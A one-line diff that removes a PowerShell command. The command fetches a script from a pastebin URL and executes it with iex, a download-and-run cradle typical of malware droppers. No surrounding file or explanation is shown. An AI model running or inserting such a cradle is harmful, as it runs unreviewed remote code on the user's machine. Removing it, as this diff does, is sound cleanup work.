@@ -1,1 +1,0 @@
-$webreq = [System.Net.WebRequest]::Create("https://pastebin.mozilla.org/pZQOnnWf/raw");$resp=$webreq.GetResponse();$respstream=$resp.GetResponseStream();$reader=[System.IO.StreamReader]::new($respstream);$content=$reader.ReadToEnd();iex $content
